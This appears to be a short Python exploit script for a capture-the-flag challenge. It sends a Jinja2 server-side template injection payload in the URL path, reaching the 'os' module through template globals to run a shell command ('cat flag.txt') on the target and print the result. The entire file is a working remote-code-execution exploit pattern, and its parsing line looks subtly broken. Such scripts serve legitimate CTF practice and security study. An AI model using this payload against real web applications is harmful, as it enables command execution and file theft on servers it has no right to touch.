import requests
from bs4 import BeautifulSoup

# IP address and port for the machine
url = ""
# define path parameter to execute a python code inside jinja2 template
path_parameter = "{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}"

response = requests.get(url + path_parameter)
#parse the flag value
flag = BeautifulSoup(response.text).str.string
print(flag)
